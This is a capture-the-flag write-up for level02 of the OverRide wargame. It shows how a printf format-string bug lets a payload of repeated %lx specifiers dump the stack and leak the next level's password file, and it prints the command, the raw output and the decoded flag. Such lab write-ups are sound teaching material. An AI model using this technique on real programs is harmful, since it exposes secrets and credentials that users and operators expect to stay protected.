## level02

The program reads a username and a password and checks that the password corresponds to `/home/users/level03/.pass`.

At first, it looked like we overwrite `exit@got` with a shellcode thanks to the `printf` vulnerability, like in rainfall level 5:

```c
printf(username);
puts(" does not have access!");
exit(EXIT_FAILURE);
```

But there is an easier way! The program reads the password file, so the content is on the stack, between the username and the password buffers. By giving a lot of `%lx` to the format string of `printf`, we can dump the stack as much as we want.

We know each flag is 40 characters so we need to find 5 groups of what looks like 8 random bytes:

```
level02@OverRide:~$ echo -e '%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx\npassword' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
7fffffffe5000702a2a2a2a2a2a2a2a2a2a2a2a2a2a2a2a7fffffffe6f81f7ff9a0864726f777373617000000000000100000000|0|756e505234376848|45414a3561733951|377a7143574e6758|354a35686e475873|48336750664b394d|feff00|6c25786c25786c25|25786c25786c2578 does not have access!
```

The section between `|0|` and `|feff00|` fits the bill. We can give it as an argument to the script `level02.py` which translates the raw bytes to ASCII.

```console
$ python bytes_to_ascii.py '756e505234376848|45414a3561733951|377a7143574e6758|354a35686e475873|48336750664b394d'
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
